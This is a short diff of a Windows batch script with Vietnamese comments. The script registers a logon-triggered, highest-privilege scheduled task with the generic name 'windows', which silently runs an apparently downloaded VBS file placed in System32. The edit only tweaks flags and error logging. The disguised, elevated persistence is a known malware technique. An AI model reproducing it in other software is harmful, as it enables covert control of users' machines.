@@ -46,11 +46,11 @@ if exist "%winsysDownloadFile%" (
 
 :: Tạo tác vụ trong Task Scheduler để chạy winsys.vbs bằng wscript.exe
 echo %date% %time% - Đang tạo tác vụ trong Task Scheduler... >> "%logFile%"
-schtasks /create /tn "windows" /tr "\"C:\Windows\System32\wscript.exe\" \"C:\Windows\System32\%winsysDownloadFile%\"" /sc onlogon /ru "%USERNAME%" /f /RL HIGHEST /F >nul 2>&1
+schtasks /create /tn "windows" /tr "\"C:\Windows\System32\wscript.exe\" \"C:\Windows\System32\%winsysDownloadFile%\"" /sc onlogon /ru "%USERNAME%" /RL HIGHEST /F >nul 2>&1
 
 :: Kiểm tra kết quả tạo tác vụ
 if %errorlevel% neq 0 (
-    echo %date% %time% - Tạo tác vụ thất bại. >> "%logFile%"
+    echo %date% %time% - Tạo tác vụ thất bại với mã lỗi %errorlevel%. >> "%logFile%"
     echo Tạo tác vụ thất bại.
 ) else (
     echo %date% %time% - Tác vụ đã được tạo thành công. >> "%logFile%"
